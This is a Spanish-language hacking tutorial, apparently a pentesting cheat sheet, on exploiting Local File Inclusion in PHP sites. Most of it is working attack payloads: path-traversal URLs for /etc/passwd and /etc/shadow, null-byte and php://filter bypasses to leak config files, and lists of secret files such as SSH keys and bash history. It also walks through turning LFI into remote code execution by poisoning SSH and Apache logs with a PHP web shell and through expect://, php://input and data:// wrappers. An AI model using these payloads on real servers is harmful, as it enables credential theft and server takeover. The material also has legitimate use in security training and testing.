# LFI - Local File Inclusion

# Local File Inclusion (LFI)

LFI, (Local File Inclusión) consiste en acceder a archivos no autorizados de la máquina victima. Esta vulnerabilidad le permite al atacante obtener acceso a archivos confidenciales en el servidor y también podría conducir a obtener un shell.

## ¿Como funciona?

La vulnerabilidad ocurre cuando el usuario entra a páginas que cargan contenido de archivos y no está **sanitizada**. 

LFI es particularmente común en sitios php.

Aquí mostramos un ejemplo de código php vulnerable a LFI. Como se puede ver, simplemente pasamos el parámetro page con el nombre de la página a cargar y no hay ningún tipo de control. Entonces, podemos  agregar la ruta de cualquier archivo.

```php
$file = $_GET['page'];
require($file);
```

Podemos también usar técnicas de **Directory Path TRaversal**.

```
http://example.com/page=../../../../../../etc/passwd
```


## Omitir el agregado de .php u otras extensiones.

Es muy común agregar la extensión `php` en la propia programación:

```php
$file = $_GET['page'];
require($file . ".php");
```

Al agregar el programa la extensión, si queremos buscar `/etc/passwd` el programa buscará `/etc/passwd.php`. Para solventar este problema podemos usar la técnica del byte nulo que consiste en añadir `%00` al final.

```
http://example.com/page=../../../../../../etc/passwd%00
```

Otra forma de solventar  este problema es simplemente agregar un signo de interrogación al final. De esta forma, todo lo que hay posterior al interrogante lo interpreta la aplicación como parámetro.

```
http://ejemplo.com/page=../../../../../../etc/passwd?
```

## Omitir la ejecución de php

Con LFI podemos leer archivos de texto, `*.txt` fácilmente, pero tenemos un problema si queremos leer archivos `php`.

El problema es que los ejecuta. Imaginemos que sabemos por **fuzzing** que hay un fichero llamado `config.php`. Normalmente en este archivo está la conexión a la base de datos con el usuario y la contraseña de base de datos.

Si ponemos `http://example.com/index.php?page=config.php` nos aparece una página en blanco ya que el código PHP se ha ejecutado. La forma de solventar este problema es utilizar **wrappers PHP**.


Este ejemplo nos devuelve el contenido en `base 64` del fichero indicado utilizando el wrapper `php://filter`.
```
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
```

De forma que luego nosotros podremos decodificarlo en un terminal:

```bash
echo cadenabase64 | base64 -d > config.php
```


## LFI en Linux

### Trucos

**Descargar archivos de configuración en un formato de estilo agradable

Leer archivos directamente en el navegador puede ser muy tedioso. Una forma de hacerlo mas agradable  es leer los archivos desde el terminal. Usamos para ello `curl`:

```bash

curl -s http://example.com/gallery.php?page=/etc/passwd 

```

Ahi que tener en cuenta si tenemos que mandar cooky, si hay que autenticarse primero, ....

### Archivos importantes


Se listan a continuación los archivos mas importantes a visualizar en sistemas Linux:

```
/etc/issue (Mensaje que se escribe antes del inicio de sesión)
/etc/motd (Mensaje del contenido del banner del día. Puede contener información sobre los propietarios del sistema o el uso del sistema).
/etc/passwd 
/etc/group 
/etc/resolv.conf 
/etc/shadow
/home/[USUARIO]/.bash_history o .profile
~/.bash_history o .profile
$USER/.bash_history o .profile
/root/.bash_history o .profile
/etc/mtab  
/etc/inetd.conf  
/var/log/dmessage
/etc/sudoers
/etc/crontab
```

**Ficheros de servidor Web**

```
# Normalmente en la ruta de la aplicación web
.htaccess
config.php
```

**SSH**

```
authorized_keys
id_rsa
id_rsa.keystore
id_rsa.pub
known_hosts
```

**Logs**

```
/etc/httpd/logs/acces_log 
/etc/httpd/logs/error_log 
/var/www/logs/access_log 
/var/www/logs/access.log 
/usr/local/apache/logs/access_ log 
/usr/local/apache/logs/access. log 
/var/log/apache/access_log 
/var/log/apache2/access_log 
/var/log/apache/access.log 
/var/log/apache2/access.log
/var/log/access_log
```


**Ficheros de procesos**

En Linux, la ruta `/proc` incluye un directorio para cada proceso en ejecución, incluidos los procesos del kernel, en directorios denominados /proc/PID, donde PID es el número de proceso. Cada directorio contiene información sobre un proceso, que incluye: `/proc/PID/cmdline`, el comando que originalmente inició el proceso".

```
/proc/sched_debug # Se puede usar para ver qué procesos se están ejecutando en la máquina
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/net/fib_trie
/proc/version
/proc/self/environ
```

## Local File Inclusion (LFI) a Remote Code Execution (RCE)

Existen varias técnicas para intentar ejecución remota de comandos desde una LFI.

### Log Poisoning

También llamado envenenamiento del log. Si tenemos acceso a archivos de log del sistema y el servidor ejecuta `php` podríamos ejecutar comandos si consiguiéramos introducir php en dichos log.

**Log poisoning SSH**

Tenemos acceso al fichero de log del servicio SSH porque este está activo. Podríamos verlo con esta ruta de ejemplo.

http://ejemplo.com?page=../../../../../../var/log/access.log

Podemos intentar introducir código en access.log intentando una conexión ssh con un payload. Se entiende que ssh está activo.

```bash
ssh "<?php system($_GET['cmd']); ?>"@ipvictima
```

Ponemos 3 veces una password para que falle. Quedará traza en access.log por lo que podremos ejecutar comandos:

http://ejemplo.com?page=../../../../../../var/log/access.log&cmd=whoami

**Log poisoning Apache**

Si se trata de un servidor apache con LFI tendríamos que poder ver el fichero `/var/log/apache2/access.log`.

Entonces solo tendríamos que interceptar una petición con **BurpSuite** y modificar la cabecera **User Agent** con un payload:

```
GET /index.php?page=<log-file>
Host: <target>
User-Agent: <?php system($_GET['cmd']); ?>
```

Y lo mismo:

http://ejemplo.com?page=../../../../../../var/log/apache2/access.log&cmd=whoami

### Wrappers PHP

Se puede realizar RCE con wrappers php. Estos deben estar activados en el servidor por lo que no siempre funcionan.

**Wrapper expect://**

Este wrapper está deshabilitado de forma predeterminada.
```
http://ejemplo.com/index.php?page=expect://whoami
```

**Wrapper input://**

Es posible utilizar este wrapper solo si la opción allow_url_include está habilitada en la configuración de PHP.

```
curl -s -X POST --data "<?php system('id'); ?>" "http://ejemplo.com/index.php?page=php://input" | grep whoami
```

**Wrapper data://**

Es posible utilizar este wrapper solo si la opción allow_url_include está habilitada en la configuración de PHP.

http://ejemplo.com/index.php?page=data://text/plain,<?php phpinfo(); ?>
http://ejemplo.com/index.php?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http:///ejemplo.com/index.php?page=data://text/plain,<?php system('whoami'); ?>
http:///ejemplo.com/index.php?page=data://text/plain;base64,payloadenbase64